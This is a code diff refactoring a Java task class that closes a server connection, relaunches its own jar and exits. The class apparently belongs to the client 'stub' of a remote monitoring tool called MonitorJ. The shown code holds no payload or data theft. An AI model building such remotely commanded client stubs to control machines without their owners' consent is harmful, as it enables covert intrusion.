@@ -1,13 +1,11 @@
 package me.jershdervis.monitorj.stub.client.tasks;
 
-import me.jershdervis.monitorj.stub.MonitorJStub;
+import me.jershdervis.monitorj.stub.client.BaseClient;
 import me.jershdervis.monitorj.stub.client.PacketTask;
 import me.jershdervis.monitorj.stub.client.Packets;
 import me.jershdervis.monitorj.stub.util.ClientSystemUtil;
 import me.jershdervis.monitorj.stub.util.ExecutionUtil;
 
-import java.io.DataInputStream;
-import java.io.DataOutputStream;
 import java.io.IOException;
 import java.net.URISyntaxException;
 
@@ -17,14 +15,14 @@ import java.net.URISyntaxException;
 public class RestartClientApplicationTask extends PacketTask {
 
     public RestartClientApplicationTask() {
-        super(Packets.RESTART_CLIENT_APPLICATION);
+        super(Packets.RESTART_CLIENT_APPLICATION.getPacketID());
     }
 
     @Override
-    public void run(DataInputStream inputStream, DataOutputStream outputStream) throws IOException {
+    public void run(BaseClient client) throws IOException {
         try {
             if(ClientSystemUtil.getCurrentRunningJar().getAbsolutePath().toLowerCase().endsWith(".jar")) {
-                MonitorJStub.getInstance().getClientServerConnection().getServerSocketConnection().close();
+                client.getServerSocketConnection().close();
                 ExecutionUtil.executeJarFile(ClientSystemUtil.getCurrentRunningJar());
                 System.exit(0);
             }
